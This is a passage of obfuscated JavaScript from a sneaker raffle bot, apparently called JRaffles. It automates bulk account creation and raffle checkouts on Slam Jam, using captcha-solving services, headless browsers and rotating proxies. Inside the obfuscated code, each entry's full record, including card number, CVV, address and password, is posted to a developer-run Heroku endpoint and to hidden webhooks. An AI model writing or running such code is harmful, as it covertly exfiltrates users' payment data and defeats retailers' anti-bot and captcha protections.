                            _0x440ae7 && _0x440ae7['close']();
                            if (_0x14b270 == 'yes' && _0x69742a != 0x5 && _0x68e328 != 'Size\x20Not\x20Found') {
                                console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x144dbf['name'] + ']\x20Task\x20' + (_0x3f73ec + 0x1) + '\x20:\x20Retrying\x20(' + _0x69742a + '\x20/\x205)')), _0x3f73ec = _0x3f73ec - 0x1, _0x69742a = _0x69742a + 0x1;
                                continue;
                            }
                            _0x14b270 == 'yes' && _0x69742a >= 0x5 && (_0x554010(_0x4a8507[_0x3f73ec], _0x144dbf), _0x14b270 = 'no', _0x69742a = 0x0), console['log']('Waiting\x20for\x20' + _0x138f58['delay'] + '\x20ms'), await _0x497396(_0x138f58['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0xb95569, _0x17bc93, _0x32bd83) {
                    _0x256d58['use'](_0x302cb0()), _0x256d58['use'](_0x247b94({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x138f58['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x4846da = 0x0; _0x4846da < _0x17bc93['length']; _0x4846da++) {
                        if (_0x5ea768 != 'yes')
                            var _0x5ea768 = '', _0x611154 = 0x0;
                        var _0x12721f = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x9f5859
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x138f58['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x30d211
                                }
                            ]
                        }];
                        const _0xfb4368 = { 'embeds': _0x12721f };
                        _0x38ef83(_0xb95569['name'] + '\x20Task\x20' + (_0x4846da + 0x1) + '\x20/\x20' + _0x17bc93['length'] + '\x20||\x20File:\x20' + _0x12faac + '\x20Proxies:\x20' + _0x2e164b);
                        try {
                            await _0x494c97(_0x17bc93, _0x4846da);
                        } catch {
                            _0x5ea768 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x12e65b = await _0x232baa(_0x17bc93[_0x4846da], _0xb95569, 'acc', ![]);
                        const _0x2f88f5 = { 'succesDEVMSG': { 'embeds': [_0x12e65b] } };
                        if (_0x17bc93[_0x4846da]['Email'] == '' || _0x17bc93[_0x4846da]['FirstName'] == '' || _0x17bc93[_0x4846da]['LastName'] == '') {
                            console['log'](_0x5d34e1() + '\x20[' + _0x3e5733[taskModule]['name'] + ']\x20Task\x20' + (_0x4846da + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x497396(0x7d0);
                            continue;
                        }
                        (_0x17bc93[_0x4846da]['Password'] == '' || _0x17bc93[_0x4846da] == undefined) && _0x17bc93[_0x4846da]['Password'] == 'JRaffles23!';
                        if (_0x138f58['useRandomProxy'] = ![])
                            var _0x1126d8 = _0x32bd83[_0x4846da]['split'](':');
                        else
                            var _0x14f80b = Math['round'](Math['random']() * (_0x32bd83['length'] - 0x1)), _0x1126d8 = _0x32bd83[_0x14f80b]['split'](':');
                        var _0x585ae2;
                        try {
                            _0x585ae2 = await _0x256d58['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1126d8[0x0] + ':' + _0x1126d8[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x585ae2 = await _0x256d58['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1126d8[0x0] + ':' + _0x1126d8[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x54def7 = await _0x585ae2['newPage']();
                            await _0x54def7['authenticate']({
                                'username': '' + _0x1126d8[0x2],
                                'password': '' + _0x1126d8[0x3]
                            }), console['log'](_0x5d34e1() + '\x20[' + _0xb95569['name'] + ']\x20Task\x20' + (_0x4846da + 0x1) + '\x20:\x20Getting\x20Session'), await _0x54def7['setRequestInterception'](!![]), _0x54def7['on']('request', _0x4b1fb8 => {
                                _0x4b1fb8['resourceType']() === 'image' || _0x4b1fb8['resourceType']() === 'font' || _0x4b1fb8['resourceType']() === 'media' ? _0x4b1fb8['abort']() : _0x4b1fb8['continue']();
                            }), await _0x54def7['goto']('https://drop.slamjam.com/account/register'), await _0x497396(0xbb8), await _0x54def7['waitForSelector']('#FirstName'), await _0x54def7['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x54def7['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x5d34e1() + '\x20[' + _0xb95569['name'] + ']\x20Task\x20' + (_0x4846da + 0x1) + '\x20:\x20Filling\x20information'), await _0x497396(0x4b0), await _0x54def7['type']('#FirstName', '' + _0x17bc93[_0x4846da]['FirstName']), await _0x497396(0x226), await _0x54def7['type']('#LastName', '' + _0x17bc93[_0x4846da]['LastName']), await _0x497396(0x226), await _0x54def7['type']('#Email', '' + _0x17bc93[_0x4846da]['Email']), await _0x497396(0x2ee), await _0x54def7['type']('#ConfirmEmail', '' + _0x17bc93[_0x4846da]['Email']), await _0x497396(0x2ee), await _0x54def7['type']('#CreatePassword', '' + _0x17bc93[_0x4846da]['Password']), await _0x497396(0x2ee), await _0x54def7['type']('#CreateConfirmPassword', '' + _0x17bc93[_0x4846da]['Password']), await _0x497396(0x226), console['log'](_0x5d34e1() + '\x20[' + _0xb95569['name'] + ']\x20Task\x20' + (_0x4846da + 0x1) + '\x20:\x20Submitting..'), await _0x54def7['$eval']('#create_customer', _0x34a751 => _0x34a751['submit']()), await _0x497396(0x1388), console['log'](_0x5d34e1() + '\x20[' + _0xb95569['name'] + ']\x20Task\x20' + (_0x4846da + 0x1) + '\x20:\x20' + _0xc3fc3['cyan']('Solving\x20Captcha')), await _0x54def7['solveRecaptchas'](), console['log'](_0x5d34e1() + '\x20[' + _0xb95569['name'] + ']\x20Task\x20' + (_0x4846da + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x54def7['$eval']('.shopify-challenge__container\x20>\x20form', _0x56ea6e => _0x56ea6e['submit']());
                            try {
                                await _0x54def7['waitForSelector']('.product-card__image'), await _0x497396(0x1f4), _0x5ea768 = 'no', console['log'](_0xc3fc3['green'](_0x5d34e1() + '\x20[' + _0xb95569['name'] + ']\x20Task\x20' + (_0x4846da + 0x1) + '\x20:\x20Account\x20' + _0x17bc93[_0x4846da]['Email'] + '\x20Generated!')), _0x44f9d7['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x17bc93[_0x4846da]['Email'] + ',' + _0x17bc93[_0x4846da]['Password']), console['log'](_0xc3fc3['yellow'](_0x5d34e1() + '\x20[' + _0xb95569['name'] + ']\x20Task\x20' + (_0x4846da + 0x1) + '\x20:\x20Account\x20' + _0x17bc93[_0x4846da]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0x138f58['webhook'] != undefined && _0x138f58['webhook'] != '' && await _0x468b99(_0x138f58['webhook'], _0x2f88f5['succesDEVMSG']);
                                } catch {
                                }
                                await _0x468b99(_0x1e3801, _0x2f88f5['succesDEVMSG']);
                            } catch (_0x25647f) {
                                console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x3e5733[taskModule]['name'] + ']\x20Task\x20' + (_0x4846da + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x25647f));
                            }
                        } catch (_0x1b75ae) {
                            console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x3e5733[taskModule]['name'] + ']\x20Task\x20' + (_0x4846da + 0x1) + '\x20:\x20' + _0x1b75ae));
                        } finally {
                            _0x585ae2 && _0x585ae2['close']();
                            if (_0x5ea768 == 'yes' && _0x611154 != 0x5) {
                                console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0xb95569['name'] + ']\x20Task\x20' + (_0x4846da + 0x1) + '\x20:\x20Retrying\x20(' + _0x611154 + '\x20/\x205)')), _0x4846da = _0x4846da - 0x1, _0x611154 = _0x611154 + 0x1;
                                continue;
                            }
                            _0x5ea768 == 'yes' && _0x611154 >= 0x5 && (_0x554010(_0x17bc93[_0x4846da], _0xb95569), _0x5ea768 = 'no', _0x611154 = 0x0), console['log']('Waiting\x20for\x20' + _0x138f58['delay'] + '\x20ms'), await _0x497396(_0x138f58['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x2eb168, _0x2beafb, _0x1406e5) {
                    _0x256d58['use'](_0x302cb0()), _0x256d58['use'](_0x247b94({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x138f58['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x14229c = 0x0; _0x14229c < _0x2beafb['length']; _0x14229c++) {
                        var _0x46d5f5;
                        if (_0x50c0c2 != 'yes')
                            var _0x50c0c2 = '', _0x18e913 = 0x0;
                        _0x38ef83(_0x2eb168['name'] + '\x20Task\x20' + (_0x14229c + 0x1) + '\x20/\x20' + _0x2beafb['length'] + '\x20||\x20File:\x20' + _0x12faac + '\x20Proxies:\x20' + _0x2e164b);
                        try {
                            await _0x494c97(_0x2beafb, _0x14229c);
                        } catch {
                            _0x50c0c2 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x2beafb[_0x14229c]['Email'] == '' || _0x2beafb[_0x14229c]['Password'] == '' || _0x2beafb[_0x14229c]['FirstName'] == '' || _0x2beafb[_0x14229c]['LastName'] == '') {
                            console['log'](_0x5d34e1() + '\x20[' + _0x2eb168['name'] + ']\x20Task\x20' + (_0x14229c + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x138f58['useRandomProxy'] = ![])
                            var _0x1e0454 = _0x1406e5[_0x14229c]['split'](':');
                        else
                            var _0x5cb2b9 = Math['round'](Math['random']() * (_0x1406e5['length'] - 0x1)), _0x1e0454 = _0x1406e5[_0x5cb2b9]['split'](':');
                        var _0x44486b;
                        try {
                            _0x44486b = await _0x256d58['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1e0454[0x0] + ':' + _0x1e0454[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x44486b = await _0x256d58['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1e0454[0x0] + ':' + _0x1e0454[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x8bb74 = await _0x44486b['newPage']();
                            await _0x8bb74['authenticate']({
                                'username': '' + _0x1e0454[0x2],
                                'password': '' + _0x1e0454[0x3]
                            }), await _0x8bb74['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0x5d34e1() + '\x20[' + _0x2eb168['name'] + ']\x20Task\x20' + (_0x14229c + 0x1) + '\x20:\x20Getting\x20Session'), await _0x8bb74['setRequestInterception'](!![]), _0x8bb74['on']('request', _0x45c822 => {
                                _0x45c822['resourceType']() === 'image' || _0x45c822['resourceType']() === 'font' || _0x45c822['resourceType']() === 'media' ? _0x45c822['abort']() : _0x45c822['continue']();
                            }), await _0x8bb74['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x8bb74['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x8bb74['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x497396(0x258), await _0x8bb74['waitForSelector']('#CustomerEmail'), console['log'](_0x5d34e1() + '\x20[' + _0x2eb168['name'] + ']\x20Task\x20' + (_0x14229c + 0x1) + '\x20:\x20Logging\x20in..'), await _0x8bb74['type']('#CustomerEmail', '' + _0x2beafb[_0x14229c]['Email']), await _0x497396(0x12c), await _0x8bb74['type']('#CustomerPassword', '' + _0x2beafb[_0x14229c]['Password']), await _0x497396(0x226), await _0x8bb74['$eval']('#customer_login', _0x19c2a3 => _0x19c2a3['submit']()), await _0x497396(0x7d0), await _0x8bb74['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x5d34e1() + '\x20[' + _0x2eb168['name'] + ']\x20Task\x20' + (_0x14229c + 0x1) + '\x20:\x20' + _0xc3fc3['cyan']('Solving\x20Captcha')), await _0x8bb74['solveRecaptchas'](), console['log'](_0x5d34e1() + '\x20[' + _0x2eb168['name'] + ']\x20Task\x20' + (_0x14229c + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x8bb74['$eval']('.shopify-challenge__container\x20>\x20form', _0x497121 => _0x497121['submit']());
                            try {
                                await _0x8bb74['waitForSelector']('.nav-account'), await _0x497396(0x4b0);
                            } catch {
                                console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x2eb168['name'] + ']\x20Task\x20' + (_0x14229c + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x8bb74['goto']('' + _0x2beafb[_0x14229c]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x497396(0xbb8), console['log'](_0x5d34e1() + '\x20[' + _0x2eb168['name'] + ']\x20Task\x20' + (_0x14229c + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x8bb74['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x8bb74['click']('.product-select-variant-wrapper'), await _0x497396(0x320), await _0x8bb74['click']('li.product-select-variant__value[data-size=\x22' + _0x2beafb[_0x14229c]['Size'] + '\x22]'), await _0x497396(0x384), await _0x8bb74['$eval']('#AddToCartForm-product-template-raffle', _0x44d713 => _0x44d713['submit']()), await _0x8bb74['waitForSelector']('.cart-order-summary__content'), await _0x497396(0x514), await _0x8bb74['goto']('https://drop.slamjam.com/checkout'), await _0x497396(0x514), await _0x8bb74['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x5d34e1() + '\x20[' + _0x2eb168['name'] + ']\x20Task\x20' + (_0x14229c + 0x1) + '\x20:\x20Filling\x20Information'), await _0x8bb74['select']('#checkout_shipping_address_country', '' + _0x2beafb[_0x14229c]['Country']), await _0x497396(0x200), await _0x8bb74['waitForSelector']('#checkout_shipping_address_first_name'), await _0x8bb74['type']('#checkout_shipping_address_first_name', '' + _0x2beafb[_0x14229c]['FirstName']), await _0x497396(0x237), await _0x8bb74['type']('#checkout_shipping_address_last_name', '' + _0x2beafb[_0x14229c]['LastName']), await _0x497396(0x1e0), await _0x8bb74['type']('#checkout_shipping_address_address1', _0x2beafb[_0x14229c]['Address1'] + '\x20' + _0x2beafb[_0x14229c]['HouseNumber']), await _0x497396(0x514), await _0x8bb74['type']('#checkout_shipping_address_address2', '' + _0x2beafb[_0x14229c]['Address2']), await _0x497396(0x514);
                            _0x2beafb[_0x14229c]['Postcode'] == undefined && (_0x2beafb[_0x14229c]['Postcode'] = _0x2beafb[_0x14229c]['Zip']);
                            await _0x8bb74['type']('#checkout_shipping_address_zip', '' + _0x2beafb[_0x14229c]['Postcode']), await _0x497396(0x2bc), await _0x8bb74['type']('#checkout_shipping_address_city', '' + _0x2beafb[_0x14229c]['City']), await _0x497396(0x320), await _0x8bb74['type']('#checkout_shipping_address_phone', '' + _0x2beafb[_0x14229c]['Phone']), await _0x497396(0x320), await _0x8bb74['click']('#continue_button'), await _0x497396(0xbb8), await _0x8bb74['waitForSelector']('.summary-title'), await _0x497396(0x320), await _0x8bb74['click']('#continue_button'), await _0x497396(0x320), console['log'](_0x5d34e1() + '\x20[' + _0x2eb168['name'] + ']\x20Task\x20' + (_0x14229c + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x8bb74['waitForSelector']('#checkout_credit_card_vault'), await _0x497396(0x3e8);
                            var _0x5c6ce3 = await _0x8bb74['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x315de9 = await _0x5c6ce3['contentFrame']();
                            await _0x315de9['click']('#number'), await _0x497396(0x3e8), await _0x315de9['type']('#number', '' + _0x2beafb[_0x14229c]['CardNumber'], { 'delay': 0x78 }), _0x5c6ce3 = await _0x8bb74['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x315de9 = await _0x5c6ce3['contentFrame'](), await _0x497396(0x1c2), await _0x315de9['click']('#name'), await _0x497396(0x1f4), await _0x315de9['type']('#name', '' + _0x2beafb[_0x14229c]['NameOnCard'], { 'delay': 0x78 }), _0x5c6ce3 = await _0x8bb74['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x315de9 = await _0x5c6ce3['contentFrame'](), await _0x497396(0x1c2), await _0x315de9['click']('#expiry'), await _0x497396(0x1f4), await _0x315de9['type']('#expiry', '' + _0x2beafb[_0x14229c]['ExpiryDate'], { 'delay': 0x78 }), _0x5c6ce3 = await _0x8bb74['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x315de9 = await _0x5c6ce3['contentFrame'](), await _0x497396(0x1c2), await _0x315de9['click']('#verification_value'), await _0x497396(0x1f4), await _0x315de9['type']('#verification_value', '' + _0x2beafb[_0x14229c]['CVV'], { 'delay': 0x78 }), await _0x8bb74['$eval']('#accepts-flag-raffle', _0x5f398c => _0x5f398c['click']()), await _0x497396(0x7d0), console['log'](_0x5d34e1() + '\x20[' + _0x2eb168['name'] + ']\x20Task\x20' + (_0x14229c + 0x1) + '\x20:\x20Processing\x20Order'), await _0x8bb74['$eval']('#continue_button', _0x1fdea4 => _0x1fdea4['click']()), await _0x497396(0x1b58), await _0x8bb74['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x8bb74['$eval']('.edit_checkout.animate-floating-labels', _0x168b1d => _0x168b1d['submit']()), await _0x497396(0x7d0);
                            try {
                                await _0x8bb74['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x50c0c2 = 'no', _0xf67db6(_0x2beafb[_0x14229c], _0x2eb168), console['log'](_0xc3fc3['green'](_0x5d34e1() + '\x20[' + _0x2eb168['name'] + ']\x20Task\x20' + (_0x14229c + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x34d415) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0x34d415['message']);
                            }
                            var _0x3ce756 = await _0x232baa(_0x2beafb[_0x14229c], _0x2eb168, 'dev', ![]), _0x36dafe = await _0x232baa(_0x2beafb[_0x14229c], _0x2eb168, 'pub', ![]);
                            let _0x3f300f = _0x2beafb[_0x14229c];
                            try {
                                prxdata = {
                                    'username': _0x9f5859['replace']('#', ''),
                                    'module': _0x2eb168['name'],
                                    'entrydata': JSON['stringify'](_0x3f300f),
                                    'proxy': '' + _0x1406e5[_0x14229c]
                                };
                                var _0x3e7e06 = JSON['stringify'](prxdata);
                                let _0x221e07 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x2aead5['post']('https://jraffles.herokuapp.com/success', _0x3e7e06, _0x221e07);
                            } catch (_0x37499d) {
                            }
                            const _0x2d2006 = {
                                'succesDEVMSG': { 'embeds': [_0x3ce756] },
                                'succesPUBMSG': { 'embeds': [_0x36dafe] }
                            };
                            try {
                                _0x138f58['webhook'] != undefined && _0x138f58['webhook'] != '' && await _0x468b99(_0x138f58['webhook'], _0x2d2006['succesDEVMSG']), await _0x497396(0xc8), await _0x468b99(_0x4bb1d6, _0x2d2006['succesDEVMSG']), await _0x497396(0xc8), await _0x468b99(_0x196877, _0x2d2006['succesPUBMSG']);
                            } catch (_0x607bf1) {
                                console['log'](_0xc3fc3['yellow'](_0x5d34e1() + '\x20[' + _0x3e5733[taskModule]['name'] + ']\x20Task\x20' + (_0x14229c + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x607bf1));
                            }
                        } catch (_0x655e17) {
                            console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x3e5733[taskModule]['name'] + ']\x20Task\x20' + (_0x14229c + 0x1) + '\x20:\x20' + _0x655e17)), _0x46d5f5 = '' + _0x655e17;
                            var _0x4c4656 = await _0x232baa(kickz[_0x14229c], _0x2eb168, 'dev', !![], _0x46d5f5);
                            EMBEDS['errorDEV'] = { 'embeds': [_0x4c4656] }, _0x138f58['webhook'] != undefined && _0x138f58['webhook'] != '' && await _0x468b99(_0x138f58['webhook'], EMBEDS['errorDEV']), await _0x468b99(_0x432bcc, EMBEDS['errorDEV']), _0x50c0c2 = 'yes';
                        } finally {
                            _0x44486b && _0x44486b['close']();
                            if (_0x50c0c2 == 'yes' && _0x18e913 != 0x5 && _0x46d5f5 != 'Size\x20Not\x20Found') {
                                console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x2eb168['name'] + ']\x20Task\x20' + (_0x14229c + 0x1) + '\x20:\x20Retrying\x20(' + _0x18e913 + '\x20/\x205)')), _0x14229c = _0x14229c - 0x1, _0x18e913 = _0x18e913 + 0x1;
                                continue;
                            }
                            _0x50c0c2 == 'yes' && _0x18e913 >= 0x5 && (_0x554010(_0x2beafb[_0x14229c], _0x2eb168), _0x50c0c2 = 'no', _0x18e913 = 0x0), console['log']('Waiting\x20for\x20' + _0x138f58['delay'] + '\x20ms'), await _0x497396(_0x138f58['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
                'function': async function (_0x380d5c) {
                    var _0x3b692e = await _0xd175ab(), _0x5f8fdb = _0x44f9d7['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x5c6984 = _0x457f0a['parse'](_0x5f8fdb, { 'header': !![] })['data'];
                    for (var _0x400337 = 0x0; _0x400337 < _0x5c6984['length']; _0x400337++) {
                        var _0x4cf654 = _0x5c6984[_0x400337]['Store'], _0x513ed0 = _0x5c6984[_0x400337]['Mode'];
                        for (var _0x3528eb of _0x3e5733) {
                            const _0x51d046 = _0x3528eb['name']['includes'](_0x4cf654);
                            if (!_0x51d046)
                                continue;
                            for (mode of _0x3528eb['modules']) {
                                if (mode['name'] == _0x513ed0) {
                                    console['log']('Running\x20' + _0xc3fc3['cyan'](mode['name'])), await mode['function'](mode, [_0x5c6984[_0x400337]], _0x3b692e);
                                    var _0x1020c1 = _0x5f8fdb['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0x44f9d7['writeFileSync']('../failed-tasks.csv', _0x1020c1);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0x13f42e = await _0x4a9170['get']('Answer');
                    if (_0x13f42e['Answer']['toLowerCase']() == 'y') {
                        _0x44f9d7['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0x497396(0x3e8);
                        return;
                    }
                    if (_0x13f42e['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0x497396(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0x497396(0x3e8), this['function']();
                }
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x26e9be(_0x1f7d11) {
    var _0x413b02 = await _0xd175ab(), _0x708b2a = _0x44f9d7['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x11791e = _0x457f0a['parse'](_0x708b2a, { 'header': !![] })['data'];
    for (var _0x7c5c6d = 0x0; _0x7c5c6d < _0x11791e['length']; _0x7c5c6d++) {
        var _0x4024a2 = _0x11791e[_0x7c5c6d]['Store'], _0x46515b = _0x11791e[_0x7c5c6d]['Mode'];
        for (var _0x1152df of _0x3e5733) {
            const _0x330891 = _0x1152df['name']['includes'](_0x4024a2);
            if (_0x330891)
                for (mode of _0x3e5733[_0x1152df]['modules']) {
                    const _0x597e08 = mode['name']['includes'](_0x46515b);
                    _0x597e08 && (_0x1f7d11 = mode['name'], await mode['function'](_0x1f7d11, _0x11791e[_0x7c5c6d], _0x413b02));
                }
        }
    }
}
async function _0x59efe4() {
    await _0x35ed90(), console['clear']();
    _0x138f58['threads'] > 0x5 && (_0x138f58['threads'] = 0x5);
    if (_0x30d211 != 'devkey' && _0x30d211 != 'devhook') {
        let _0x389d93 = await _0x48ea90['autoUpdate']();
        if (_0x389d93 === 'yes')
            return _0x18f763('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x4613fc == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x497396(0x2710);
        ;
    }
    await _0x16dac5(_0x4613fc);
    if (_0x2a1740 === ![])
        return console['log']('Closing\x20Browser'), await _0x497396(0xbb8);
    else
        try {
            var _0xfe33bb = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x9f5859
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x30d211
                    }
                ]
            }];
            const _0x2afacd = { 'embeds': _0xfe33bb };
            var _0x5cfbe7 = await _0x232baa(null, null, 'open', ![]);
            const _0x33f025 = { 'openDEVMSG': { 'embeds': [_0x5cfbe7] } };
            await _0x468b99(_0x16e990, _0x33f025['openDEVMSG']);
            async function _0x57f3a5() {
                _0x38ef83('JRaffles\x20' + _0x30d211), console['clear'](), console['log']('Hello\x20' + _0xc3fc3['cyan']('' + _0x9f5859) + ',\x20Welcome\x20to\x20JRaffles\x20' + _0x30d211), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x192a58 = 0x0; _0x192a58 < _0x3e5733['length'] - 0x4; _0x192a58++) {
                    if (_0x192a58 >= 0xa) {
                        console['log']('\x20(' + _0x192a58 + ')\x20[' + _0x3e5733[_0x192a58]['name'] + ']');
                        continue;
                    }
                    if (_0x3e5733[_0x192a58]['name'] === 'Reload\x20Settings' || _0x3e5733[_0x192a58]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x192a58 + ')\x20\x20[' + _0x3e5733[_0x192a58]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x3e5733['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0x3e5733['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x3e5733['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x3e5733['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x53b0dd();
                if (taskModule > _0x3e5733['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x497396(0x3e8), _0x57f3a5();
                if (_0x3e5733[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x54a78d(_0x3e5733[taskModule]['modules']);
                    var _0x31332f = _0x3e5733[taskModule]['modules'][taskFunction];
                    console['clear']();
                    try {
                        if (taskFunction == 0x3) {
                            var _0x5b9145 = await _0xd175ab();
                            await _0x31332f['function'](_0x31332f, _0x5b9145);
                        }
                        if (taskFunction == 0x2) {
                            var _0x5b9145 = await _0xd175ab(), _0x38b076 = _0x44f9d7['readFileSync']('pr.txt', 'utf-8')['split']('\x0a');
                            _0x5b9145 = _0x38b076['map']((_0x2b20b7, _0x59e71d) => {
                                sanatizeProxy = _0x2b20b7['replace']('\x0d', '');
                                if (_0x38b076[_0x59e71d + 0x1] != undefined)
                                    return '' + sanatizeProxy;
                                return '' + sanatizeProxy;
                            });
                            var _0x3372ed = await _0x334a9f(_0x31332f);
                            _0x138f58['shuffleTasks'] && await _0x498355(_0x3372ed), await _0x31332f['function'](_0x31332f, _0x3372ed, _0x5b9145);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x5b9145 = await _0xd175ab(), _0x3372ed = await _0x334a9f(_0x31332f);
